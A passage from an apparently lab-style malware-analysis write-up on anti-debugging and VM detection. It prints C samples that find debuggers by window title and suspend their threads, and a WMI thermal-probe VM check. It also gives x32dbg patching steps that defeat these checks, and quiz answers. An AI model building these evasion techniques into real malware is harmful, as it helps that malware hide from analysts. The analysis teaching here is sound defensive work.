<td><strong>Anti-VM Techniques</strong></td> <td>Detects virtual machines (common in malware analysis) using <code class="language-plaintext highlighter-rouge">CPUID</code>, hardware, or BIOS checks.</td> </tr> <tr> <td><strong>Thread Hiding Techniques</strong></td> <td>Uses <code class="language-plaintext highlighter-rouge">NtSetInformationThread()</code> to hide threads from the debugger.</td> </tr> <tr> <td><strong>Dynamic Code Loading</strong></td> <td>Loads or decrypts code only at runtime, preventing static analysis and debugging.</td> </tr> <tr> <td><strong>Process Forking</strong></td> <td>Spawns child processes and transfers execution, leaving the debugger attached to the inactive parent process.</td> </tr> <tr> <td><strong>Kernel Debugger Detection</strong></td> <td>Checks for kernel-level debugging using flags like <code class="language-plaintext highlighter-rouge">KdDebuggerEnabled</code> or special I/O control queries.</td> </tr> <tr> <td><strong>Deliberate Crashes</strong></td> <td>Intentionally crashes or corrupts memory to disrupt debugger operation and analysis.</td> </tr> <tr> <td><strong>Stack Frame Manipulation</strong></td> <td>Alters or destroys stack frames to confuse the debugger and make execution tracing difficult.</td> </tr> <tr> <td><strong>Anti-Step Techniques</strong></td> <td>Confuses debugger step commands by injecting or redirecting code execution to non-linear addresses. It modifies the program flow of itself while runnning.</td> </tr> </tbody> </table> <h3 id="questions">Questions</h3> <p><strong>What is the name of the Windows API function used in a common anti-debugging technique that detects if a debugger is running?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">IsDebuggerPresent</code></em></p> <h2 id="task-3---anti-debugging-using-suspend-thread">Task 3 - Anti-Debugging using Suspend Thread</h2> <p><a href="https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-suspendthread">SuspendThread</a> is a Windows API function used to pause the execution of a thread in a running process. Besides its main purpose, a malware process uses this function to suspend itself if it recognizes being debugged.</p> <p>The provided code snippet in this room to conceptualize the idea of suspending the thread if a debugger is found is the following:</p> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;windows.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;wchar.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;tlhelp32.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span>
<span class="n">DWORD</span> <span class="n">g_dwDebuggerProcessId</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>

<span class="n">BOOL</span> <span class="n">CALLBACK</span> <span class="nf">EnumWindowsProc</span><span class="p">(</span><span class="n">HWND</span> <span class="n">hwnd</span><span class="p">,</span> <span class="n">LPARAM</span> <span class="n">dwProcessId</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">DWORD</span> <span class="n">dwWindowProcessId</span><span class="p">;</span>
    <span class="n">GetWindowThreadProcessId</span><span class="p">(</span><span class="n">hwnd</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">dwWindowProcessId</span><span class="p">);</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">dwProcessId</span> <span class="o">==</span> <span class="n">dwWindowProcessId</span><span class="p">)</span>
    <span class="p">{</span>
  <span class="kt">int</span> <span class="n">windowTitleSize</span> <span class="o">=</span> <span class="n">GetWindowTextLengthW</span><span class="p">(</span><span class="n">hwnd</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">windowTitleSize</span> <span class="o">&lt;=</span> <span class="mi">0</span> <span class="p">)</span>
  <span class="p">{</span>
   <span class="k">return</span> <span class="n">TRUE</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="kt">wchar_t</span><span class="o">*</span> <span class="n">windowTitle</span> <span class="o">=</span> <span class="p">(</span><span class="kt">wchar_t</span><span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">((</span><span class="n">windowTitleSize</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">*</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">wchar_t</span><span class="p">));</span>
  
        <span class="n">GetWindowTextW</span><span class="p">(</span><span class="n">hwnd</span><span class="p">,</span> <span class="n">windowTitle</span><span class="p">,</span> <span class="n">windowTitleSize</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>

  <span class="k">if</span> <span class="p">(</span><span class="n">wcsstr</span><span class="p">(</span><span class="n">windowTitle</span><span class="p">,</span> <span class="s">L"dbg"</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span> <span class="o">||</span>
   <span class="n">wcsstr</span><span class="p">(</span><span class="n">windowTitle</span><span class="p">,</span> <span class="s">L"debugger"</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span> <span class="p">)</span>
  <span class="p">{</span>
            <span class="n">g_dwDebuggerProcessId</span> <span class="o">=</span> <span class="n">dwProcessId</span><span class="p">;</span>
   <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
  <span class="p">}</span>
 
       <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">return</span> <span class="n">TRUE</span><span class="p">;</span>
<span class="p">}</span>

<span class="n">DWORD</span> <span class="nf">IsDebuggerProcess</span><span class="p">(</span><span class="n">DWORD</span> <span class="n">dwProcessId</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">EnumWindows</span><span class="p">(</span><span class="n">EnumWindowsProc</span><span class="p">,</span> <span class="p">(</span><span class="n">LPARAM</span><span class="p">)</span><span class="n">dwProcessId</span><span class="p">);</span>
    <span class="k">return</span> <span class="n">g_dwDebuggerProcessId</span> <span class="o">==</span> <span class="n">dwProcessId</span><span class="p">;</span>
<span class="p">}</span>

<span class="n">DWORD</span> <span class="nf">SuspendDebuggerThread</span><span class="p">()</span>
<span class="p">{</span>
 <span class="n">HANDLE</span> <span class="n">hSnapshot</span> <span class="o">=</span> <span class="n">CreateToolhelp32Snapshot</span><span class="p">(</span><span class="n">TH32CS_SNAPTHREAD</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">hSnapshot</span> <span class="o">==</span> <span class="n">INVALID_HANDLE_VALUE</span><span class="p">)</span>
 <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"Failed to create snapshot</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="n">THREADENTRY32</span> <span class="n">te32</span><span class="p">;</span>
    <span class="n">te32</span><span class="p">.</span><span class="n">dwSize</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">THREADENTRY32</span><span class="p">);</span>

    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">Thread32First</span><span class="p">(</span><span class="n">hSnapshot</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">te32</span><span class="p">))</span>
 <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"Failed to get first thread</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
        <span class="n">CloseHandle</span><span class="p">(</span><span class="n">hSnapshot</span><span class="p">);</span>
        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">do</span>
 <span class="p">{</span>
        <span class="n">HANDLE</span> <span class="n">hThread</span> <span class="o">=</span> <span class="n">OpenThread</span><span class="p">(</span><span class="n">THREAD_QUERY_INFORMATION</span> <span class="o">|</span> <span class="n">THREAD_SUSPEND_RESUME</span><span class="p">,</span> <span class="n">FALSE</span><span class="p">,</span> <span class="n">te32</span><span class="p">.</span><span class="n">th32ThreadID</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">hThread</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span>
  <span class="p">{</span>
            <span class="n">DWORD</span> <span class="n">dwProcessId</span> <span class="o">=</span> <span class="n">GetProcessIdOfThread</span><span class="p">(</span><span class="n">hThread</span><span class="p">);</span>
   <span class="k">if</span> <span class="p">(</span> <span class="n">IsDebuggerProcess</span><span class="p">(</span><span class="n">dwProcessId</span><span class="p">)</span> <span class="p">)</span>
   <span class="p">{</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"Debugger found with pid %i! Suspending!</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">dwProcessId</span><span class="p">);</span>
    <span class="n">DWORD</span> <span class="n">result</span> <span class="o">=</span> <span class="n">SuspendThread</span><span class="p">(</span><span class="n">hThread</span><span class="p">);</span>
     <span class="k">if</span> <span class="p">(</span> <span class="n">result</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span> <span class="p">)</span>
    <span class="p">{</span>
     <span class="n">printf</span><span class="p">(</span><span class="s">"Last error: %i</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
    <span class="p">}</span>
   <span class="p">}</span>
            <span class="n">CloseHandle</span><span class="p">(</span><span class="n">hThread</span><span class="p">);</span>
        <span class="p">}</span>
    <span class="p">}</span> <span class="k">while</span> <span class="p">(</span><span class="n">Thread32Next</span><span class="p">(</span><span class="n">hSnapshot</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">te32</span><span class="p">));</span>

    <span class="n">CloseHandle</span><span class="p">(</span><span class="n">hSnapshot</span><span class="p">);</span>

    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
<span class="p">{</span>
 <span class="n">SuspendDebuggerThread</span><span class="p">();</span>

 <span class="n">printf</span><span class="p">(</span><span class="s">"Continuing malicious operation..."</span><span class="p">);</span>
 <span class="n">getchar</span><span class="p">();</span>
<span class="p">}</span>
</code></pre></div></div> <p>In short, this source code would be doing this when running:</p> <ul> <li>It enumerates every thread in the Windows system</li> <li>For each thread, it uses <a href="https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-enumwindows">EnumWindow</a> to get their window title.</li> <li>If one of these has <code class="language-plaintext highlighter-rouge">debugger</code> or <code class="language-plaintext highlighter-rouge">dbg</code> in their title, the malware knows a debugger is running.</li> <li>When the debugger has been discovered, the malware calls <code class="language-plaintext highlighter-rouge">SuspendThread</code> to stop the debugger from running, which makes it crash.</li> <li>Therefore, the malware continues its activity.</li> </ul> <h3 id="patching">Patching</h3> <p>Pathcing is one of most critical skill required by an analyst. It lets us change the behavior of the binary by changing its instructions.</p> <p>On the program called <code class="language-plaintext highlighter-rouge">suspend-thread.exe</code>, based on the code snippet available above, we will patch the debugger-checking technique to bypass it using x32dbg.</p> <p>To begin with, we will use the <em>run</em> button or <code class="language-plaintext highlighter-rouge">F9</code> to get to the entry point.</p> <figure> <picture> <img src="/assets/img/images/thm_anti-reverse_engineering/rkQj97xRA.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="suspend-thread entry point" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p>Then, we can <em>Right click -&gt; Search for -&gt; This module -&gt; Intermodular Calls</em>. This will redirect us to the call made by the program.</p> <figure> <picture> <img src="/assets/img/images/thm_anti-reverse_engineering/rkPnsmgRA.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Search for SuspendThread() 1" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p>If we would go to <em>Symbols -&gt; Click on “suspend-thread.exe” -&gt; Search “SuspendThread”</em>, we would be redirected to where the function really is.</p> <figure> <picture> <img src="/assets/img/images/thm_anti-reverse_engineering/rJe_ome0A.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Search for SuspendThread() 2" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p>After doing the first trick, we remove the function call by filling the function with NOPs (<em>No Operation</em> opcode) by doing <em>Right click on the operation -&gt; Binary -&gt; Fill with NOPs</em>. The hex value for opcode <code class="language-plaintext highlighter-rouge">nop</code> is <code class="language-plaintext highlighter-rouge">90</code>.</p> <figure> <picture> <img src="/assets/img/images/thm_anti-reverse_engineering/SyR707xAC.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Filling SuspendThread() call with NOPs" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p>Subsequently, in order to apply our patch forever on the binary, we may click on <em>File -&gt; Patch file</em> or <code class="language-plaintext highlighter-rouge">Ctrl+P</code>. Then we click on <em>Patch file</em> and save the program.</p> <figure> <picture> <img src="/assets/img/images/thm_anti-reverse_engineering/BJ4HyVl0R.png" class="img-fluid rounded z-depth-1" width="70%" height="auto" title="Patching file" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p>Now, if we run the program, we will get the <em>“Debugger found with PID XXXX! Suspending!”</em> message. However, it won’t suspend the thread as we erased the <code class="language-plaintext highlighter-rouge">SuspendThread()</code> call.</p> <figure> <picture> <img src="/assets/img/images/thm_anti-reverse_engineering/H1Gx-NlR0.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Suspending bypassed" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <h3 id="questions-1">Questions</h3> <p><strong>What is the Windows API function that enumerates windows on the screen so the malware can check the window name?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">EnumWindows</code></em></p> <p><strong>What is the hex value of a nop instruction?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">90</code></em></p> <p><strong>What is the instruction found at memory location <code class="language-plaintext highlighter-rouge">004011CB</code>?</strong></p> <p>On x32dbg, do <em>Right click -&gt; Go to -&gt; Expression</em> or hit <em>Ctrl+G</em>, then write the memory address.</p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">add esp,8</code></em></p> <h2 id="task-4---vm-detection-overview">Task 4 - VM Detection (Overview)</h2> <p>Virtual Machines are software platforms that emulates a computer environment inside another computer. These are useful in reverse engineering because they provide a cost-effective, controlled and isolated environment for monitoring and analyzing suspicious software or malware. They also allow the creation of snapshots/checkpoints that can be used to restore the system to a previous state, which helps test different scenarios and maintain an history of the analysis process.</p> <p>When malware identifies that it is running on a VM, it may decide to respond differently, for example:</p> <ul> <li>Executing a minimal subset of its functionnality</li> <li>Self-destructing or code parts overwriting</li> <li>Cause damage to the system</li> <li>Not run at all</li> </ul> <h3 id="detection-techniques">Detection Techniques</h3> <p>Malware can employ various techniques to detect a Vm environment such as:</p> <table> <thead> <tr> <th>Detection Technique</th> <th>Explanation</th> </tr> </thead> <tbody> <tr> <td>Checking running processes</td> <td>VMs have easily identifiable processes; for example, VMWare runs a process called <code class="language-plaintext highlighter-rouge">vmtools</code>, while VirtualBox has <code class="language-plaintext highlighter-rouge">vboxservice</code>. Malware can use the EnumProcess Windows API to list all the processes running on the machine and look for the presence of these tools.</td> </tr> <tr> <td>Checking installed software</td> <td>Malware can look in the Windows Registry for a list of installed software under the <code class="language-plaintext highlighter-rouge">SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall</code> Registry key. From here, it can check for installed programs like debuggers, decompilers, forensics tools, etc.</td> </tr> <tr> <td>Network fingerprinting</td> <td>Malware can look for specific MAC and network addresses unique to VMs. For example, VMs autogenerate MAC addresses that start with any of the following numbers: <em>00-05-69</em>, <em>00-0c-29</em>, <em>00-1c-14</em> or <em>00-50-56</em>. These numbers are unique and are specifically assigned to a VM vendor called the OUI (Organizationally Unique Identifier).</td> </tr> <tr> <td>Checking machine resources</td> <td>Malware can look at a machine’s resources like RAM and CPU Utilization percentages. For example, a machine with RAM amounting to less than 8GB can indicate a virtual machine, as they are typically not assigned a significant amount.</td> </tr> <tr> <td>Detecting peripherals</td> <td>Some malware checks for connected printers because this is rarely configured properly on VMs, sometimes not even configured at all.</td> </tr> <tr> <td>Checking for domain membership</td> <td>Corporate networks are a usual target for malware. An easy way to determine this is by checking if the current machine is part of an Active Directory domain. This can quickly be done without the use of API calls by checking the LoggonServer and ComputerName environment variables.</td> </tr> <tr> <td>Timing-based attacks</td> <td>Malware can measure the time it takes to execute specific instructions or access particular machine resources. For example, some instructions can be faster on a physical machine compared to a virtual machine.</td> </tr> </tbody> </table> <h3 id="anti-vm-detection">Anti-VM Detection</h3> <p>To prevent malware using some of the techniques above, we can apply several cahnges that will remove VM-related artefacts. For example, registry entries or MAC Address modifications can bypass some of them, however, it can become tedious to protect us from everything.</p> <p>Some scripts or videos are available to help automate this process, which some are listed below:</p> <ul> <li><a href="https://www.youtube.com/watch?v=koWipFDgD6chttps://">Eric Parker’s video “Setting up an UNDETECTABLE VM for Malware analysis”</a></li> <li><a href="https://ludovic-coulon.com/blog/create-malware-analysis-environment/">Ludovic Coulon’s blog post based on Eric Parker’s Video</a></li> <li><a href="https://github.com/d4rksystem/VMwareCloak">VMWareCloak</a></li> <li><a href="https://github.com/d4rksystem/VBoxCloak">VBoxCloak</a></li> <li><a href="https://github.com/hzqst/VmwareHardenedLoader">VMWare-Hardened-Loader</a></li> </ul> <p>A known tool to test the efficiency of the anti-vm changes made is <a href="https://github.com/a0rtega/pafish">pafish</a>. It is a testing tool that uses different techniques to detect virtual machines and malware analysis environments in the same way that malware families do.</p> <h3 id="questions-2">Questions</h3> <p><strong>What is the name of the identifiable process used by malware to check if the machine is running inside VirtualBox?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">vboxservice</code></em></p> <p><strong>What is the OUI automatically assigned specifically to VMware?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">00:50:56</code></em></p> <p><strong>Using Task Manager, what process indicates that the machine for this room is an Amazon EC2 Virtual Machine?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">amazon-ssm-agent.exe</code></em></p> <h2 id="task-5---vm-detection-by-checking-the-temperature">Task 5 - VM Detection by Checking the Temperature</h2> <p><code class="language-plaintext highlighter-rouge">Win32_TempereatureProbe</code> is a Windows Management Instrumentation (WMI) class that conatins real-time temperature readings from the hardware through the SMBIOS (System Management BIOS) data structure. In a virutalized environment, the returned value is <code class="language-plaintext highlighter-rouge">Not Supported</code>, which is what malware looks for.</p> <p>WMI is a feature to gather detailed system information such as hardware configuration, OS status, installed software, network settings, running processes and more, which allows management and monitoring on both local and remote systems.</p> <blockquote> <p>Note: <code class="language-plaintext highlighter-rouge">Win32_TemperatureProbe</code> may also return <code class="language-plaintext highlighter-rouge">Not Supported</code> even on physical machines which doesn’t support the SMBIOS feature. This makes it unreliable but valuable when used with other techniques mentioned previously.</p> </blockquote> <p>The binary named <code class="language-plaintext highlighter-rouge">vm-detection.exe</code> behaves as proceeding with non-malicious activities when executed in a VM.</p> <figure> <picture> <img src="/assets/img/images/thm_anti-reverse_engineering/HybJTHxAC.png" class="img-fluid rounded z-depth-1" width="50%" height="auto" title="VM Detection detected" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p>Thus, it proceeds with malicious ones when executed on a physical machine.</p> <figure> <picture> <img src="/assets/img/images/thm_anti-reverse_engineering/BkK-aHeAA.png" class="img-fluid rounded z-depth-1" width="50%" height="auto" title="VM Detection undetected" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p>The code snippet is available below:</p> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;windows.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;wbemidl.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;combaseapi.h&gt;</span><span class="cp">
</span>
<span class="cp">#pragma comment(lib, "wbemuuid.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "oleaut32.lib")
</span>
<span class="n">BOOL</span> <span class="nf">hasThermalZoneTemp</span><span class="p">();</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
<span class="p">{</span>
 <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">hasThermalZoneTemp</span><span class="p">()</span> <span class="p">)</span>
 <span class="p">{</span>
  <span class="n">MessageBox</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="s">"Proceeding with non-malicious activities..."</span><span class="p">,</span> <span class="s">"VM Detected"</span> <span class="p">,</span> <span class="n">MB_OK</span><span class="p">);</span>
  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
 <span class="p">}</span>

 <span class="n">MessageBox</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="s">"Proceeding with malicious activities..."</span><span class="p">,</span> <span class="s">"Starting malware"</span><span class="p">,</span> <span class="n">MB_OK</span><span class="p">);</span>
 <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>

<span class="n">BOOL</span> <span class="nf">hasThermalZoneTemp</span><span class="p">()</span>
<span class="p">{</span>
 <span class="n">IWbemLocator</span><span class="o">*</span> <span class="n">pLoc</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
 <span class="n">IWbemServices</span><span class="o">*</span> <span class="n">pSvc</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
 <span class="n">IEnumWbemClassObject</span><span class="o">*</span> <span class="n">pEnumerator</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
 <span class="n">IWbemClassObject</span><span class="o">*</span> <span class="n">pclsObj</span> <span class="o">=</span> <span class="p">(</span><span class="n">IWbemClassObject</span><span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="n">IWbemClassObject</span><span class="p">));</span>
 
 <span class="n">ULONG</span> <span class="n">uReturn</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

 <span class="n">HRESULT</span> <span class="n">hr</span> <span class="o">=</span> <span class="n">CoInitializeEx</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">COINIT_MULTITHREADED</span><span class="p">);</span>
 <span class="n">hr</span> <span class="o">=</span> <span class="n">CoInitializeSecurity</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">RPC_C_AUTHN_LEVEL_DEFAULT</span><span class="p">,</span> <span class="n">RPC_C_IMP_LEVEL_IMPERSONATE</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">EOAC_NONE</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
 <span class="n">hr</span> <span class="o">=</span> <span class="n">CoCreateInstance</span><span class="p">(</span><span class="n">CLSID_WbemLocator</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">CLSCTX_INPROC_SERVER</span><span class="p">,</span> <span class="n">IID_IWbemLocator</span><span class="p">,</span> <span class="p">(</span><span class="n">LPVOID</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">pLoc</span><span class="p">);</span>
 <span class="n">hr</span> <span class="o">=</span> <span class="n">pLoc</span><span class="o">-&gt;</span><span class="n">ConnectServer</span><span class="p">(</span><span class="s">L"root</span><span class="se">\\</span><span class="s">wmi"</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">pSvc</span><span class="p">);</span>
 <span class="n">hr</span> <span class="o">=</span> <span class="n">CoSetProxyBlanket</span><span class="p">(</span><span class="n">pSvc</span><span class="p">,</span> <span class="n">RPC_C_AUTHN_WINNT</span><span class="p">,</span> <span class="n">RPC_C_AUTHZ_NONE</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">RPC_C_AUTHN_LEVEL_CALL</span><span class="p">,</span> <span class="n">RPC_C_IMP_LEVEL_IMPERSONATE</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">EOAC_NONE</span><span class="p">);</span>
 <span class="n">hr</span> <span class="o">=</span> <span class="n">pSvc</span><span class="o">-&gt;</span><span class="n">ExecQuery</span><span class="p">(</span><span class="s">L"WQL"</span><span class="p">,</span> <span class="s">L"SELECT * FROM MSAcpi_ThermalZoneTemperature"</span><span class="p">,</span> <span class="n">WBEM_FLAG_FORWARD_ONLY</span> <span class="o">|</span> <span class="n">WBEM_FLAG_RETURN_IMMEDIATELY</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">pEnumerator</span><span class="p">);</span>

 <span class="k">while</span> <span class="p">(</span><span class="n">pEnumerator</span><span class="p">)</span>
 <span class="p">{</span>
  <span class="n">hr</span> <span class="o">=</span> <span class="n">pEnumerator</span><span class="o">-&gt;</span><span class="n">Next</span><span class="p">(</span><span class="n">WBEM_INFINITE</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">pclsObj</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">uReturn</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">uReturn</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
  <span class="p">{</span>
   <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
  <span class="p">}</span>

  <span class="n">VARIANT</span> <span class="n">vtProp</span><span class="p">;</span>

  <span class="n">hr</span> <span class="o">=</span> <span class="n">pclsObj</span><span class="o">-&gt;</span><span class="n">Get</span><span class="p">(</span><span class="s">L"CurrentTemperature"</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">vtProp</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">SUCCEEDED</span><span class="p">(</span><span class="n">hr</span><span class="p">))</span>
  <span class="p">{</span>
   <span class="n">printf</span><span class="p">(</span><span class="s">"Thermal Zone Temperature: %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">vtProp</span><span class="p">.</span><span class="n">intVal</span><span class="p">);</span>
   <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
  <span class="p">}</span>

  <span class="n">VariantClear</span><span class="p">(</span><span class="o">&amp;</span><span class="n">vtProp</span><span class="p">);</span>
  <span class="n">pclsObj</span><span class="o">-&gt;</span><span class="n">Release</span><span class="p">();</span>
 <span class="p">}</span>

 <span class="n">pEnumerator</span><span class="o">-&gt;</span><span class="n">Release</span><span class="p">();</span>
 <span class="n">pSvc</span><span class="o">-&gt;</span><span class="n">Release</span><span class="p">();</span>
 <span class="n">pLoc</span><span class="o">-&gt;</span><span class="n">Release</span><span class="p">();</span>
 
 <span class="n">CoUninitialize</span><span class="p">();</span>

    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>

</code></pre></div></div> <h3 id="preventing-temperature-checking">Preventing Temperature Checking</h3> <p>While we could patch a function with <code class="language-plaintext highlighter-rouge">nop</code> to prevent it from being called, instead we will manipulate memory directly and change the execution flow with <em>EIP</em> (RIP in x64).</p> <p>Firstly, we will jump straight to the <em>EntryPoint</em> of the program.</p> <figure> <picture> <img src="/assets/img/images/thm_anti-reverse_engineering/Hk5-W8l0A.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="vm-detection EntryPoint" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p>Secondly, we need to go to <code class="language-plaintext highlighter-rouge">uReturn</code>, which is the variable that indicates if the query has returned a class or not (the <code class="language-plaintext highlighter-rouge">Not Supported</code>). For that, we can try to go near it by searching for strings and go to the address location with the <em>SELECT * FROM MSAcpi_ThermalZoneTemperature</em> string.</p> <figure> <picture> <img src="/assets/img/images/thm_anti-reverse_engineering/HJSm4UxCC.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="vm-detection string search" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p>When we got there, we can observe a part which corresponds to <code class="language-plaintext highlighter-rouge">pEnumerator-&gt;Next(WBEM_INFINITE, 1, &amp;pclsObj, &amp;uReturn);</code>.</p> <figure> <picture> <img src="/assets/img/images/thm_anti-reverse_engineering/HJCGILeAR.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="vm-detection pEnumerator function" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p>As we press <code class="language-plaintext highlighter-rouge">F8</code> (Step Over), we eventually get at the address <code class="language-plaintext highlighter-rouge">004010FD</code>, which is where the comparison <code class="language-plaintext highlighter-rouge">uReturn == 0</code> is made:</p> <figure> <picture> <img src="/assets/img/images/thm_anti-reverse_engineering/rJSYvLxCR.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="vm-detection compare" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p>Since <code class="language-plaintext highlighter-rouge">uReturn</code> has the address <code class="language-plaintext highlighter-rouge">ebp-18</code> and because we want to modify that value to bypass that jump, we will follow it on dump by <em>Right clicking on the opcode cmp -&gt; Follow in Dump -&gt; Address: EBP-18</em>.</p> <figure> <picture> <img src="/assets/img/images/thm_anti-reverse_engineering/SJ0mKUgA0.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="uReturn dump follow" loading="lazy" 